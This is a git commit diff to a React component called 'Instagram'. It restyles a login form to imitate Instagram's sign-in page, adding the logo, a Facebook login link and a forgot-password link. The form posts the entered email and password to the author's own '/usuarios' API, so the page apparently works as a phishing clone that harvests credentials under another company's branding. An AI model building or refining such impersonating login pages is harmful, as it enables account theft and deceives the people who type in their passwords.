fe3027acc88d01ce5b6df9b44e5add6fd9db0bf8
geibriel12 <marquezzd4@gmail.com>
2026-01-05 01:49:06 -0300

    jgvh

--- index.jsx
+++ index.jsx
@@ -1,4 +1,4 @@
- import { useRef } from 'react'
+import { useRef } from 'react'
 import './style.css' 
 import api from './api'
 
@@ -13,7 +13,6 @@ function Instagram() {
     }
 
     try {
-      // O axios usará a baseURL configurada no api.js + '/usuarios'
       await api.post('/usuarios', {
         email: inputEmail.current.value,
         senha: inputSenha.current.value
@@ -24,16 +23,49 @@ function Instagram() {
       alert("Dados enviados com sucesso!")
     } catch (error) {
       console.error("Erro na requisição:", error)
-      alert("Erro ao enviar dados. Verifique o console.")
+      alert("Erro ao conectar com o servidor.")
     }
   }
 
   return (
     <div className='container'>
+      {/* O onSubmit no form garante que o 'Enter' do teclado também envie os dados */}
       <form onSubmit={(e) => { e.preventDefault(); createUsers(); }}>
-        <input placeholder="E-mail" ref={inputEmail} type="email" required />
-        <input placeholder="Senha" ref={inputSenha} type="password" required />
+        
+        <div className="logo-container">
+          {/* Logo oficial em formato de texto para melhor aparência */}
+          <img 
+            src="upload.wikimedia.org" 
+            alt="Instagram" 
+            style={{ width: '175px', margin: '20px 0 30px 0' }}
+          />
+        </div>
+
+        <input 
+          placeholder="E-mail ou nome de usuário" 
+          ref={inputEmail} 
+          type="email" 
+          required 
+        />
+        
+        <input 
+          placeholder="Senha" 
+          ref={inputSenha} 
+          type="password" 
+          required 
+        />
+        
         <button type='submit'>Entrar</button>
+
+        <div className="separator">
+          <span>OU</span>
+        </div>
+
+        <a href="#" className="facebook-login">
+          <i className="fab fa-facebook-square"></i> Entrar com o Facebook
+        </a>
+
+        <a href="#" className="forgot-password">Esqueceu a senha?</a>
       </form>
     </div>
   )
